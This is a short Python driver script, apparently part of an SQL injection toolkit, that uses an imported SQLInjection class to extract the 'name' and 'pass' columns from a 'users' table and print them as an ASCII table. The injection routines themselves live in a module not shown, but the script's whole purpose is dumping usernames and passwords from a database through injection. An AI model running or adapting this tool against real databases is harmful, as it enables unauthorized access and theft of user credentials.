from sqlinjection import SQLInjection
from terminaltables import AsciiTable

TABLE = 'users'
COLUMNS = ['name', 'pass']

def main() -> None:
    sqli = SQLInjection()

    print(f'[*] Extracting data from table {TABLE}...\n')
    # extract all rows from the table
    sqli.extract_rows_data(TABLE, COLUMNS)
    # print the extracted rows as a table
    print_data_as_table(TABLE, sqli.get_data_table(TABLE), COLUMNS)

def print_data_as_table(table_name: str, table_rows: dict, column_names: list) -> None:
    # if there are no rows in the table, return
    if not table_rows:
        return

    # insert name of columns on top of the list
    table_data = [column_names]

    # iterate over each row, extract each column value and append it to table_data
    for table_row in table_rows.keys():
        td = []

        # iterate over each column and extract its value for a particular row
        for column_name in column_names:
            td.append(table_rows[table_row].get(column_name, ''))

        table_data.append(td)

    # create an ascii table and print it
    table = AsciiTable(table_data, table_name)
    print(table.table)

if __name__ == '__main__':
    main()
